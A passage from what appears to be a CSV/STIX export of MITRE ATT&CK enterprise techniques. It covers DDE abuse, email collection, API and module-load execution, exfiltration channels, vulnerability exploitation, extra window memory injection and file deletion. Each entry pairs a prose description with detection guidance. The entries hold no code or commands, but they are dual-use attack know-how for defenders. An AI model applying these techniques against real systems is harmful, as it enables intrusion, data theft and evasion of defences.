Permissions Required: User","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1157', 'external_id': 'T1157'}, {'source_name': 'Writing Bad Malware for OSX', 'description': 'Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.', 'url': 'https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf'}, {'source_name': 'Malware Persistence on OS X', 'description': 'Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.', 'url': 'https://www.rsaconference.com/writable/presentations/file%20upload/ht-r03-malware-persistence-on-os-x-yosemite%20final.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['File monitoring']","['User']","['macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","['Administrator', 'root']","","","",""
"attack-pattern","attack-pattern--edbe24e9-aec4-4994-ac75-6a6bc7f1ddd0","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Dynamic Data Exchange","Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE is still enabled in Windows 10 and most of Microsoft Office 2016 (a December 2017 patch created a Registry key that disables DDE in Word by default). (Citation: BleepingComputer DDE Disabled in Word Dec 2017)

Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014) and used to deliver execution via spear phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.

Detection: OLE and Office Open XML files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution. (Citation: NVisio Labs DDE Detection Oct 2017)

Monitor for Microsoft Office applications loading DLLs and other modules not typically associated with the application.

Monitor for spawning of unusual processes (such as cmd.exe) from Microsoft Office applications.

Platforms: Windows

Data Sources: API monitoring, DLL monitoring, Process Monitoring, Windows Registry, Windows event logs

Permissions Required: User

Remote Support: No","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1173', 'external_id': 'T1173'}, {'source_name': 'BleepingComputer DDE Disabled in Word Dec 2017', 'description': 'Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.', 'url': 'https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/'}, {'source_name': 'SensePost PS DDE May 2016', 'description': 'El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The Power Within. Retrieved November 22, 2017.', 'url': 'https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/'}, {'source_name': 'Kettle CSV DDE Aug 2014', 'description': 'Kettle, J. (2014, August 29). Comma Separated Vulnerabilities. Retrieved November 22, 2017.', 'url': 'https://www.contextis.com/blog/comma-separated-vulnerabilities'}, {'source_name': 'SensePost MacroLess DDE Oct 2017', 'description': 'Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code Exec in MSWord. Retrieved November 21, 2017.', 'url': 'https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/'}, {'source_name': 'NVisio Labs DDE Detection Oct 2017', 'description': 'NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents. Retrieved November 21, 2017.', 'url': 'https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'DLL monitoring', 'Process Monitoring', 'Windows Registry', 'Windows event logs']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","False","",""
"attack-pattern","attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f","2017-05-31T21:31:25.454Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Email Collection","Adversaries may target user email to collect sensitive information from a target.

Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.

Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.

Some adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.

Detection: There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.

File access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.

Monitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Windows

Data Sources: Authentication logs, File monitoring, Process monitoring, Process use of network","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1114', 'external_id': 'T1114'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs', 'File monitoring', 'Process monitoring', 'Process use of network']","","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","",""
"attack-pattern","attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670","2017-05-31T21:31:17.472Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Execution through API","Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters. (Citation: Microsoft CreateProcess)

Additional Windows API calls that can be used to execute binaries include: (Citation: Kanthak Verifier)

*CreateProcessA() and CreateProcessW(),
*CreateProcessAsUserA() and CreateProcessAsUserW(),
*CreateProcessInternalA() and CreateProcessInternalW(),
*CreateProcessWithLogonW(), CreateProcessWithTokenW(),
*LoadLibraryA() and LoadLibraryW(),
*LoadLibraryExA() and LoadLibraryExW(),
*LoadModule(),
*LoadPackagedLibrary(),
*WinExec(),
*ShellExecuteA() and ShellExecuteW(),
*ShellExecuteExA() and ShellExecuteExW()

Detection: Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.

Platforms: Windows

Data Sources: API monitoring, Process monitoring

Permissions Required: User, Administrator, SYSTEM

Remote Support: No

Contributors: Stefan Kanthak","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1106', 'external_id': 'T1106'}, {'source_name': 'Microsoft CreateProcess', 'description': 'Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.', 'url': 'http://msdn.microsoft.com/en-us/library/ms682425'}, {'source_name': 'Kanthak Verifier', 'description': 'Kanthak, S. (2017). Application Verifier Provider. Retrieved February 13, 2017.', 'url': 'https://skanthak.homepage.t-online.de/verifier.html'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['API monitoring', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Stefan Kanthak']","","","False","",""
"attack-pattern","attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65","2017-05-31T21:31:40.542Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Execution through Module Load","The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)

The module loader can load DLLs:

*via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
    
*via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
    
*via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
    
*via `<file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname"">` in an embedded or external ""application manifest"". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.

Adversaries can use this functionality as a way to execute arbitrary code on a system.

Detection: Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to `%SystemRoot%` and `%ProgramFiles%` directories will protect against module loads from unsafe paths. 

Correlation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.

Platforms: Windows

Data Sources: Process Monitoring, API monitoring, File monitoring, DLL monitoring

Permissions Required: User

Contributors: Stefan Kanthak","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1129', 'external_id': 'T1129'}, {'source_name': 'Wikipedia Windows Library Files', 'description': 'Wikipedia. (2017, January 31). Microsoft Windows library files. Retrieved February 13, 2017.', 'url': 'https://en.wikipedia.org/wiki/Microsoft%20Windows%20library%20files'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Process Monitoring', 'API monitoring', 'File monitoring', 'DLL monitoring']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Stefan Kanthak']","","","","",""
"attack-pattern","attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776","2017-05-31T21:30:44.720Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Exfiltration Over Alternative Protocol","Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: User interface, Process monitoring, Process use of network, Packet capture, Netflow/Enclave netflow, Network protocol analysis

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1048', 'external_id': 'T1048'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['User interface', 'Process monitoring', 'Process use of network', 'Packet capture', 'Netflow/Enclave netflow', 'Network protocol analysis']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d","2017-05-31T21:30:41.804Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Exfiltration Over Command and Control Channel","Data exfiltration is performed over the Command and Control channel.  Data is encoded into the normal communications channel using the same protocol as command and control communications.

Detection: Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: User interface, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1041', 'external_id': 'T1041'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['User interface', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87","2017-05-31T21:30:25.159Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Exfiltration Over Other Network Medium","Exfiltration could occur over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel. Adversaries could choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.

Detection: Processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a mouse click or key press) but access the network without such may be malicious.

Platforms: Linux, macOS, Windows

Data Sources: User interface, Process monitoring

Requires Network: Yes

Contributors: Itzik Kotler, SafeBreach","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1011', 'external_id': 'T1011'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['User interface', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Itzik Kotler, SafeBreach']","","","","True",""
"attack-pattern","attack-pattern--e6415f09-df0e-48de-9aba-928c902b7549","2017-05-31T21:30:46.461Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Exfiltration Over Physical Medium","In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.

Detection: Monitor file access on removable media. Detect processes that execute when removable media are mounted.

Platforms: Linux, macOS, Windows

Data Sources: Data loss prevention, File monitoring

System Requirements: Presence of physical medium or device

Requires Network: No","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1052', 'external_id': 'T1052'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Data loss prevention', 'File monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","['Presence of physical medium or device']","","False",""
"attack-pattern","attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839","2017-05-31T21:30:55.066Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Exploitation of Vulnerability","Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Exploiting software vulnerabilities may allow adversaries to run a command or binary on a remote system for lateral movement, escalate a current process to a higher privilege level, or bypass security mechanisms. Exploits may also allow an adversary access to privileged accounts and credentials. One example of this is MS14-068, which can be used to forge Kerberos tickets using domain user permissions. (Citation: Technet MS14-068) (Citation: ADSecurity Detecting Forged Tickets)

Detection: Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Software and operating system crash reports may contain useful contextual information about attempted exploits that correlate with other malicious activity. Exploited processes may exhibit behavior that is unusual for the specific process, such as spawning additional processes or reading and writing to files.

Platforms: Linux, macOS, Windows

Data Sources: Windows Error Reporting, File monitoring, Process monitoring

Effective Permissions: User, Administrator, SYSTEM

Defense Bypassed: Anti-virus, System access controls

Permissions Required: User, Administrator, SYSTEM

System Requirements: Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.

Contributors: John Lambert, Microsoft Threat Intelligence Center","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'lateral-movement'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1068', 'external_id': 'T1068'}, {'source_name': 'ADSecurity Detecting Forged Tickets', 'description': 'Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.', 'url': 'https://adsecurity.org/?p=1515'}, {'source_name': 'Technet MS14-068', 'description': 'Microsoft. (2014, November 18). Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780). Retrieved December 23, 2015.', 'url': 'https://technet.microsoft.com/en-us/library/security/ms14-068.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Windows Error Reporting', 'File monitoring', 'Process monitoring']","['User', 'Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['John Lambert, Microsoft Threat Intelligence Center']","['User', 'Administrator', 'SYSTEM']","['Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.']","","","['Anti-virus', 'System access controls']"
"attack-pattern","attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d","2017-05-31T21:31:44.421Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","External Remote Services","Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management can also be used externally.

Adversaries may use remote services to access and persist within a network. (Citation: Volexity Virtual Private Keylogging) Access to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as part of Redundant Access during an operation.

Detection: Follow best practices for detecting adversary use of Valid Accounts for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.

Platforms: Windows

Data Sources: Authentication logs

Permissions Required: User

Contributors: Daniel Oakley, Travis Smith, Tripwire","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1133', 'external_id': 'T1133'}, {'source_name': 'Volexity Virtual Private Keylogging', 'description': 'Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.', 'url': 'https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Authentication logs']","['User']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Daniel Oakley', 'Travis Smith, Tripwire']","","","","",""
"attack-pattern","attack-pattern--52f3d5a6-8a0f-4f82-977e-750abf90d0b0","2018-01-16T16:13:52.465Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Extra Window Memory Injection","Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). (Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)

Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.

Execution granted through EWM injection may take place in the address space of a separate live process. Similar to Process Injection, this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. (Citation: Engame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)

Detection: Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong (Citation: Microsoft GetWindowLong function) and SetWindowLong (Citation: Microsoft SetWindowLong function). Malware associated with this technique have also used SendNotifyMessage (Citation: Microsoft SendNotifyMessage function) to trigger the associated window procedure and eventual malicious injection. (Citation: Engame Process Injection July 2017)

Platforms: Windows

Defense Bypassed: Anti-virus, Host intrusion prevention systems, Data Execution Prevention

Permissions Required: Administrator, SYSTEM","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1181', 'external_id': 'T1181'}, {'source_name': 'Microsoft Window Classes', 'description': 'Microsoft. (n.d.). About Window Classes. Retrieved December 16, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx'}, {'source_name': 'Microsoft GetWindowLong function', 'description': 'Microsoft. (n.d.). GetWindowLong function. Retrieved December 16, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx'}, {'source_name': 'Microsoft SetWindowLong function', 'description': 'Microsoft. (n.d.). SetWindowLong function. Retrieved December 16, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx'}, {'source_name': 'Engame Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}, {'source_name': 'MalwareTech Power Loader Aug 2013', 'description': 'MalwareTech. (2013, August 13). PowerLoader Injection – Something truly amazing. Retrieved December 16, 2017.', 'url': 'https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html'}, {'source_name': 'WeLiveSecurity Gapz and Redyms Mar 2013', 'description': 'Matrosov, A. (2013, March 19). Gapz and Redyms droppers based on Power Loader code. Retrieved December 16, 2017.', 'url': 'https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/'}, {'source_name': 'Microsoft SendNotifyMessage function', 'description': 'Microsoft. (n.d.). SendNotifyMessage function. Retrieved December 16, 2017.', 'url': 'https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","","['Administrator', 'SYSTEM']","['Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","","['Anti-virus', 'Host intrusion prevention systems', 'Data Execution Prevention']"
"attack-pattern","attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433","2017-05-31T21:30:21.689Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","Fallback Channels","Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Malware reverse engineering, Process use of network, Process monitoring

Requires Network: Yes","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1008', 'external_id': 'T1008'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring']","","['Linux', 'macOS', 'Windows']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","","","","","True",""
"attack-pattern","attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59","2017-05-31T21:31:17.915Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","File Deletion","Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)

Detection: It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.

Platforms: Linux, Windows, macOS

Data Sources: Binary file metadata, File monitoring, Process command-line parameters

Defense Bypassed: Host forensic analysis

Permissions Required: User

Contributors: Walker Johnson","[{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}]","[{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/wiki/Technique/T1107', 'external_id': 'T1107'}, {'source_name': 'Trend Micro APT Attack Tools', 'description': 'Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.', 'url': 'http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/'}]","['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168']","['Binary file metadata', 'File monitoring', 'Process command-line parameters']","['User']","['Linux', 'Windows', 'macOS']","2.1","2.1.0","['enterprise-attack']","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","1.0","['Walker Johnson']","","","","","['Host forensic analysis']"
"attack-pattern","attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5","2017-05-31T21:30:20.934Z","2018-01-17T12:56:55.080Z","identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5","File System Logical Offsets","Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)

Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)

Detection: Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)

Monitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through PowerShell, additional logging of PowerShell scripts is recommended.

Platforms: Windows

Data Sources: API monitoring

Defense Bypassed: File monitoring, File system access controls

